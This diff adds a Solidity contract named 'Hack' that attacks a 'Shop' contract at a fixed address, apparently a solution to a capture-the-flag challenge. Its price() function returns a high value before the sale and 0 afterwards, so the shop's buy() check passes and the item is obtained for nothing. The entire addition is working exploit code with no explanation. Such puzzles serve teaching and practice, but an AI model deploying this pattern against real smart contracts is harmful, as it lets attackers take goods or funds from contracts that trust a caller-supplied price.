@@ -18,3 +18,16 @@ contract Shop {
         }
     }
 }
+
+contract Hack {
+    address target = 0x3611142DfDa1b1fB974DC08A81cA2C99e666c87E;
+    Shop shop = Shop(target);
+    function price() external view returns (uint256) {
+        if(shop.isSold() == true)
+            return 0;
+        return 114514;
+    }
+    function attack() public {
+        shop.buy();
+    }
+}
